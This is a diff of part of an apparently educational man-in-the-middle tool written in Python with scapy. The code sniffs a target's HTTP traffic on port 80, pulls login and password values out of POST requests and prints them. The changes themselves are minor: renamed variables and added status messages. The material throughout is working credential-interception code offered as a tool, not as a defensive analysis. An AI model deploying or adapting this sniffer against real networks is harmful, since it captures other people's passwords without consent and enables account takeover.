@@ -1,6 +1,5 @@
 from pip._vendor.distlib.compat import raw_input
 from scapy.all import *
-
 from src.mitm.utils import get_mac
 
 user_login = ""
@@ -33,19 +32,19 @@ def get_http_credentials(pkt):
                 full_str_credentials = full_str_credentials + payload[i]
 
         except Exception as e:
-            print("an error occured: " + str(e))
             print("credentials not found in POST request")
             return
-
+        
+        print("credentials found in POST request")
         for j in range(get_index(full_str_credentials, login_field) + len(login_field),
                        full_str_credentials.index("&")):
-            login = login + full_str_credentials[j]
+            user_login = user_login + full_str_credentials[j]
 
         for k in range(get_index(full_str_credentials, password_field) + len(password_field),
                        len(full_str_credentials)):
-            password = password + full_str_credentials[k]
+            user_password = user_password + full_str_credentials[k]
 
-        print("user user_login: " + login + " | user user_password: " + password)
+        print("user login: " + user_login + " | user password: " + user_password)
         sys.exit(1)
 
     else:
@@ -64,7 +63,8 @@ def run():
         print("\n[*] User Requested Shutdown")
         print("[*] Exiting...")
         sys.exit(1)
-
+    
+    print("Analysing packets...")
     client_mac = get_mac(target1_ip)
     sniff(iface=interface, prn=get_http_credentials,
           filter='dst port 80 and ether src {} and host {}'.format(client_mac, target2_ip), store=0, count=0)
